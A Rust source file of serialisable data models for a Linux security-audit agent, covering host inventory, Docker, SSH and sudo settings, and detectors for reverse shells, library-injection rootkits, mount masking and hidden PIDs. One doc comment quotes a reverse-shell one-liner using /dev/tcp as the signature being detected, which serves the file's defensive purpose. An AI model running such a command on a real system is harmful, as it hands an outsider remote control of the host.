use serde::{Deserialize, Serialize};

fn default_scoring_version() -> u8 {
    1
}
fn one() -> u32 {
    1
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentReport {
    pub scan_id: String,
    pub timestamp: String,
    pub version: String,
    pub duration_secs: f64,
    pub risk_score: u8,
    pub is_root_execution: bool,
    pub scan_warnings: Vec<String>,
    #[serde(default)]
    pub coverage_warnings: Vec<String>,
    #[serde(default = "default_scoring_version")]
    pub scoring_version: u8,
    pub host: HostInfo,
    pub databases: Vec<DatabaseInfo>,
    pub network: NetworkInfo,
    pub storage: StorageInfo,
    pub topology: TopologyInfo,
    pub security: SecurityInfo,
    pub packages: PackagesInfo,
}

impl Default for AgentReport {
    fn default() -> Self {
        Self {
            scan_id: String::new(),
            timestamp: String::new(),
            version: String::new(),
            duration_secs: 0.0,
            risk_score: 0,
            is_root_execution: false,
            scan_warnings: Vec::new(),
            coverage_warnings: Vec::new(),
            scoring_version: 1,
            host: HostInfo::default(),
            databases: Vec::new(),
            network: NetworkInfo::default(),
            storage: StorageInfo::default(),
            topology: TopologyInfo::default(),
            security: SecurityInfo::default(),
            packages: PackagesInfo::default(),
        }
    }
}

// ---------------------------------------------------------------------------
// Cron severity classification (shared between scanner and scoring)
// ---------------------------------------------------------------------------

/// Severity of a cron job based on its content.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq, Default)]
pub enum CronSeverity {
    /// No suspicious patterns found.
    #[default]
    Ok,
    /// Uses custom paths or tools that may be legitimate but should be reviewed.
    Warning,
    /// Contains clear indicators of compromise (reverse shells, downloads, etc.).
    Critical,
}

/// A single cron job with its classification.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct CronJob {
    pub command: String,
    pub severity: CronSeverity,
}

// ---------------------------------------------------------------------------
// HostInfo
// ---------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
#[serde(default)]
pub struct HostInfo {
    pub hostname: String,
    pub external_ipv4: String,
    pub hosting_provider: String,
    pub os_install_date: String,
    pub os_version: String,
    pub kernel: String,
    pub uptime_days: u64,
    pub reboot_required: bool,
    pub cpu_cores: usize,
    pub total_ram_mb: u64,
    pub swap_total_mb: u64,
    pub swap_used_mb: u64,
    pub load_average: (f64, f64, f64),
    pub open_files_limit: String,
    pub oom_kills: usize,
    pub zombie_processes: usize,
    pub security_modules: Vec<String>,
    pub dmesg_errors: Vec<String>,
    pub gpu_devices: Vec<String>,
    pub native_services: Vec<String>,

    /// Cron jobs collected from the system, each classified by severity.
    pub cron_jobs: Vec<CronJob>,

    pub systemd_timers: Vec<String>,
    pub tech_stack: Vec<String>,
    pub top_memory_processes: Vec<ProcessInfo>,
    pub failed_services: Vec<String>,
    pub backup_tools: Vec<String>,
    pub last_restic_snapshot: Option<String>,
    pub ntp_synchronized: bool,
    pub time_offset_ms: Option<f64>,
    pub reboot_required_pkgs: Vec<String>,
    pub zombie_details: Vec<ZombieInfo>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessInfo {
    pub name: String,
    pub pid: u32,
    pub memory_mb: u64,
    #[serde(default = "one")]
    pub instances: u32,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ZombieInfo {
    pub pid: u32,
    pub name: String,
    pub ppid: u32,
    pub parent_name: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DatabaseInfo {
    pub engine: String,
    pub version: String,
    pub data_dir: String,
    pub size_mb: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct NetworkInfo {
    pub firewall_active: bool,
    pub dns_resolvers: Vec<String>,
    pub custom_host_overrides: Vec<String>,
    pub ssl_certificates: Vec<SslCertInfo>,
    pub listening_ports: Vec<PortInfo>,
    #[serde(default)]
    pub dns_upstreams: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SslCertInfo {
    pub domain: String,
    pub expiry_date: String,
    pub days_remaining: Option<i64>,
    pub is_critical: bool,
    pub is_warning: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PortInfo {
    pub protocol: String,
    pub port: String,
    pub process: String,
    pub bind_address: String,
    #[serde(default)]
    pub pid: Option<u32>,
    #[serde(default)]
    pub exe_path: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct StorageInfo {
    pub disks: Vec<DiskInfo>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DiskInfo {
    pub mount_point: String,
    pub total_mb: u64,
    pub used_mb: u64,
    pub usage_pct: f64,
    pub inode_usage_percent: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct TopologyInfo {
    pub docker_active: bool,
    pub images_count: usize,
    pub dangling_images_count: usize,
    pub total_images_size_mb: u64,
    pub total_dangling_size_mb: u64,
    pub dangling_volumes_count: usize,
    pub dangling_images: Vec<DanglingImageInfo>,
    pub containers: Vec<ContainerInfo>,
    #[serde(default)]
    pub images_reclaimable_mb: u64,
    #[serde(default)]
    pub build_cache_reclaimable_mb: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DanglingImageInfo {
    pub id: String,
    pub size_mb: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ContainerInfo {
    pub name: String,
    pub image: String,
    pub state: String,
    pub status: String,
    pub size_mb: u64,
    pub log_size_mb: u64,
    pub ports: Vec<String>,
    pub mounts: Vec<String>,
    pub privileged: bool,
    pub memory_limit_mb: Option<u64>,
    pub cpu_limit: Option<f64>,
    pub cap_add: Vec<String>,
    #[serde(default)]
    pub sensitive_mounts: Vec<String>,
    #[serde(default)]
    pub restart_count: u64,
    #[serde(default)]
    pub oom_killed: bool,
    #[serde(default)]
    pub health_status: Option<String>,
    #[serde(default)]
    pub rw_size_mb: u64,
    /// Live CapBnd of the container's init process (host pid), read from the
    /// kernel at scan time. None = container not running or /proc unreadable
    /// (non-root scan). Ground truth for the DOCK-010 runtime-tamper delta.
    #[serde(default)]
    pub runtime_bounding_caps: Option<u64>,
}

impl ContainerInfo {
    pub fn security_issues(&self) -> Vec<&'static str> {
        let mut issues = Vec::new();
        if self.privileged {
            issues.push("PRIVILEGED");
        }
        if self.memory_limit_mb.is_none() {
            issues.push("NoMemLimit");
        }
        if self.cpu_limit.is_none() {
            issues.push("NoCpuLimit");
        }
        if self.cap_add.contains(&"SYS_ADMIN".to_string()) {
            issues.push("SYS_ADMIN");
        }
        if self.cap_add.contains(&"NET_ADMIN".to_string()) {
            issues.push("NET_ADMIN");
        }
        issues
    }
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct SecurityInfo {
    pub ssh_password_auth_enabled: bool,
    pub ssh_root_login_enabled: bool,
    #[serde(default)]
    pub ssh_permit_root_login_detail: Option<String>,
    pub shell_users: Vec<UserInfo>,
    pub fail2ban_active: bool,
    pub auditd_active: bool,
    pub ssh_config_source: String,
    pub sudo_nopasswd_entries: Vec<String>,
    pub sudoers_mode: Option<u32>,
    pub sysctl_issues: Vec<String>,
    #[serde(default)]
    pub access_alignment: AccessAuditResult,
    #[serde(default)]
    pub secret_hygiene: Vec<SecretLeak>,
    #[serde(default)]
    pub capability_audit: Vec<ProcCapFinding>,
    #[serde(default)]
    pub suspicious_processes: Vec<SuspiciousProcess>,
    #[serde(default)]
    pub mount_masking: Vec<MountMaskingFinding>,
    #[serde(default)]
    pub reverse_shells: Vec<ReverseShellFinding>,
    #[serde(default)]
    pub library_injections: Vec<LibraryInjectionFinding>,
    #[serde(default)]
    pub ghost_pids: Vec<GhostPidFinding>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UserInfo {
    pub username: String,
    pub last_login: String,
    pub last_ssh_login: String,
    pub authorized_keys_count: usize,
}

#[derive(Serialize, Debug, Clone, Copy, PartialEq, Default)]
pub enum PackageManager {
    Apt,
    Dnf,
    Yum,
    Pacman,
    Zypper,
    #[default]
    Unknown,
}

impl<'de> Deserialize<'de> for PackageManager {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        Ok(match s.as_str() {
            "Apt" => PackageManager::Apt,
            "Dnf" => PackageManager::Dnf,
            "Yum" => PackageManager::Yum,
            "Pacman" => PackageManager::Pacman,
            "Zypper" => PackageManager::Zypper,
            _ => PackageManager::Unknown,
        })
    }
}

impl PackageManager {
    pub fn is_known(&self) -> bool {
        !matches!(self, PackageManager::Unknown)
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpgradablePackage {
    pub name: String,
    pub current_version: String,
    pub new_version: String,
    pub is_security: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct PackagesInfo {
    pub manager: PackageManager,
    pub installed_count: usize,
    pub upgradable: Vec<UpgradablePackage>,
    pub cache_refreshed: bool,
}

// Diff model (compare v2)

#[derive(Debug, Clone, Serialize)]
pub struct SnapshotMeta {
    pub hostname: String,
    pub timestamp: String,
    pub version: String,
    pub scoring_version: u8,
    pub risk_score: u8,
}

impl SnapshotMeta {
    pub fn from_report(r: &AgentReport) -> Self {
        Self {
            hostname: r.host.hostname.clone(),
            timestamp: r.timestamp.clone(),
            version: r.version.clone(),
            scoring_version: r.scoring_version,
            risk_score: r.risk_score,
        }
    }
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum HostDiffStatus {
    Compared,
    Added,
    Removed,
}

#[derive(Debug, Clone, Serialize)]
pub struct DiffReport {
    pub before: Option<SnapshotMeta>,
    pub after: Option<SnapshotMeta>,
    pub changes: Vec<Change>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Change {
    pub field: String,
    pub before: Option<String>,
    pub after: Option<String>,
    pub severity: Severity,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Severity {
    Improved,
    Degraded,
    Changed,
}

#[derive(Debug, Clone, Serialize)]
pub struct MultiHostDiff {
    pub hostname: String,
    pub status: HostDiffStatus,
    pub diff: DiffReport,
}

// IAM & Access Alignment Models

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SshKeyAudit {
    pub user: String,
    pub algorithm: String,
    pub bits: u32,
    pub comment: String,
    pub compliant: bool,
    pub reason: Option<String>,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SudoersEntry {
    pub principal: String,
    pub source_file: String,
    pub scope: String,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
pub struct AccessAuditResult {
    #[serde(default)]
    pub keys: Vec<SshKeyAudit>,
    #[serde(default)]
    pub coverage_warnings: Vec<String>,
    #[serde(default)]
    pub sudoers_nopasswd_all: Vec<SudoersEntry>,
}

// DLP & Secret Hygiene Models

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SecretLeak {
    pub pid: u32,
    pub process: String,
    pub source: String,
    pub matched_key: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct SuspiciousProcess {
    pub pid: u32,
    pub name: String,
    #[serde(default)]
    pub exe_path: Option<String>,
    #[serde(default)]
    pub is_deleted: bool,
    #[serde(default)]
    pub euid: u32,
    #[serde(default)]
    pub is_mimic: bool,
}

// Process Capability Audit Models

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ProcCapFinding {
    pub pid: u32,
    pub comm: String,
    pub euid: u32,
    pub effective: u64,
    pub permitted: u64,
    pub inheritable: u64,
    pub bounding: u64,
    #[serde(default)]
    pub ambient: u64,
    /// None = line absent (kernel < 4.10) or snapshot predates this field.
    #[serde(default)]
    pub no_new_privs: Option<bool>,
    /// 0 disabled / 1 strict / 2 filter; None = no CONFIG_SECCOMP or old snapshot.
    #[serde(default)]
    pub seccomp: Option<u8>,
    pub critical_caps: Vec<String>,
}

// Bind‑mount / overlay masking (SEC‑021)

/// A mount point that appears to hide something a defender would want to see:
/// a `/proc/<pid>` overlay (process hiding) or a tmpfs/bind overlay on top of
/// a log or container-log path (evidence hiding). Parsed from
/// `/proc/self/mountinfo`.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct MountMaskingFinding {
    /// Mount point being masked (mountinfo field 5), e.g. `/proc/1234`.
    pub target_path: String,
    /// Mount source (mountinfo post-separator field 2), e.g. `tmpfs`, `/dev/sda1`.
    pub mount_source: String,
    /// Filesystem type (mountinfo post-separator field 1), e.g. `tmpfs`, `ext4`.
    pub fstype: String,
    /// Why this was flagged, for the evidence string (e.g. `hidden PID`,
    /// `tmpfs over /var/log`, `bind overlay on /var/log`).
    #[serde(default)]
    pub reason: String,
}

// Reverse-shell / C2 correlation (SEC-022)

/// An interactive interpreter (bash, python, nc, socat, …) holding an
/// ESTABLISHED outbound TCP socket to a public remote address, with that
/// socket wired to one of its stdio fds (0/1/2). This is the signature of a
/// classic reverse shell (`bash -i >& /dev/tcp/host/port 0>&1`), correlated
/// from `/proc/net/tcp{,6}` (established) × `/proc/<pid>/fd`.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ReverseShellFinding {
    pub pid: u32,
    /// Process comm (the interpreter name that matched the shell allowlist).
    pub process: String,
    /// Resolved executable path, if readable.
    #[serde(default)]
    pub exe_path: Option<String>,
    /// Remote endpoint the socket is connected to, `ip:port`.
    pub remote_address: String,
    /// Which stdio fd carried the socket: 0=stdin, 1=stdout, 2=stderr.
    /// None = socket held on a non-stdio fd (weaker, still reported).
    #[serde(default)]
    pub stdio_fd: Option<u8>,
}

// Userspace rootkit / library injection (SEC-023)

/// Evidence that a process has a shared object injected from a writable or
/// ephemeral location — the signature of a userspace rootkit / LD_PRELOAD
/// implant (libprocesshider, Azazel, Jynx). Sourced from `/proc/<pid>/environ`
/// (LD_PRELOAD / LD_LIBRARY_PATH pointing at an ephemeral path) and
/// `/proc/<pid>/maps` (a file-backed .so actually mapped from such a path).
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct LibraryInjectionFinding {
    pub pid: u32,
    /// Process comm, for the evidence string.
    pub process: String,
    /// The offending path (the .so or the LD_* value).
    pub object_path: String,
    /// Where it was observed: "LD_PRELOAD", "LD_LIBRARY_PATH", or "maps".
    pub source: String,
    /// True when the mapped object is marked "(deleted)" — a stronger IoC
    /// (implant unlinked to hide from disk inspection).
    #[serde(default)]
    pub is_deleted: bool,
}

// True Ghost PID — LKM rootkit process hiding (SEC-024)

/// A PID that is live via direct `/proc/<pid>` stat AND/OR `kill(pid,0)` but is
/// absent from the `readdir("/proc")` listing across multiple probe cycles —
/// the signature of a getdents64-hooking LKM rootkit (Diamorphine class).
/// `confirmed_ioc` distinguishes a hard IoC (survived all cycles, age ≥ 2s,
/// live state) from a downgraded suspicion (young/racy/unconfirmable).
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct GhostPidFinding {
    pub pid: u32,
    /// Process state from /proc/<pid>/stat (R/S/D/Z/…), if readable.
    #[serde(default)]
    pub state: Option<String>,
    /// Age in seconds derived from starttime, if computable.
    #[serde(default)]
    pub age_secs: Option<u64>,
    /// How existence was confirmed: "stat-path", "kill", or "stat-path+kill".
    /// A "kill"-only confirmation with stat-path ENOENT indicates a rootkit
    /// hiding the direct /proc path too (advanced variant).
    pub confirmed_via: String,
    /// True = hard IoC (exit-3 eligible); false = downgraded suspicion.
    #[serde(default)]
    pub confirmed_ioc: bool,
    /// Corroboration: this hidden PID also owns a network socket.
    #[serde(default)]
    pub holds_socket: bool,
}
